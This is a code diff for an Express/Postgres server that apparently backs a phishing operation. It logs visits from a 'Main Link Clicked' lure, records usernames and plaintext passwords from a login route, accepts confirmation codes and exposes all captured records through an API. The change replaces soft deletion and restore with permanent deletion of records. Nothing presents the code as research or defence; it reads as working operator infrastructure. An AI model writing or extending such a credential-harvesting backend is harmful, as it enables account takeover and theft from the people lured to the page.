@@ -12,7 +12,6 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-// Create Table with deleted flag
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -20,8 +19,7 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     password TEXT,
     address TEXT,
     ip TEXT,
-    timestamp TEXT,
-    deleted BOOLEAN DEFAULT false
+    timestamp TEXT
 )`).then(() => console.log("✅ Supabase Connected"))
    .catch(err => console.error("Table Error:", err.message));
 
@@ -45,7 +43,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// Routes
+// ==================== ROUTES ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
@@ -67,7 +65,7 @@ app.post('/api/login', async (req, res) => {
 
 app.get('/api/records', async (req, res) => {
     try {
-        const result = await pool.query("SELECT * FROM records WHERE deleted = false ORDER BY id DESC");
+        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
         res.json(result.rows);
     } catch (err) {
         res.json([]);
@@ -88,22 +86,15 @@ app.post('/api/confirm-code', async (req, res) => {
     }
 });
 
+// Delete Single Record
 app.post('/api/delete-record', async (req, res) => {
     const { id } = req.body;
     try {
-        await pool.query("UPDATE records SET deleted = true WHERE id = $1", [id]);
+        await pool.query("DELETE FROM records WHERE id = $1", [id]);
+        console.log(`🗑️ Record ${id} deleted`);
         res.json({ success: true });
     } catch (err) {
-        res.status(500).json({ success: false });
-    }
-});
-
-app.post('/api/restore-record', async (req, res) => {
-    const { id } = req.body;
-    try {
-        await pool.query("UPDATE records SET deleted = false WHERE id = $1", [id]);
-        res.json({ success: true });
-    } catch (err) {
+        console.error("Delete Error:", err.message);
         res.status(500).json({ success: false });
     }
 });
